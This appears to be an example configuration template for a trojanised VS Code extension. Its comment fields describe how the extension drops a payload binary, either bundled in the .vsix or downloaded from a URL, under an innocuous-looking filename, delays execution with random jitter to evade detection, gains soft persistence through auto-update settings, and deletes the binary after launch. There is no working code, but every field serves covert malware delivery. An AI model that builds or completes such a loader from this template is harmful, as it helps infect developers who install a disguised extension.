_comment: Copy this file to config.json and fill in your values. config.json is gitignored.
_comment_method: embedded = binary bundled in the .vsix | download = fetch at runtime via url
_comment_url: If method=download, set this to the URL serving your payload binary
_comment_payloadName: Filename for the dropped payload (should look innocuous)
_comment_delayMs: Delay (ms) before payload execution after extension activation
_comment_jitterMs: Random jitter (ms) added to delayMs to avoid deterministic patterns
_comment_persist: Enable VS Code auto-update settings for soft persistence
_comment_cleanup: Delete the dropped binary after execution (fileless after launch)
_comment_cleanupDelayMs: Delay (ms) before cleanup — must be long enough for payload to start
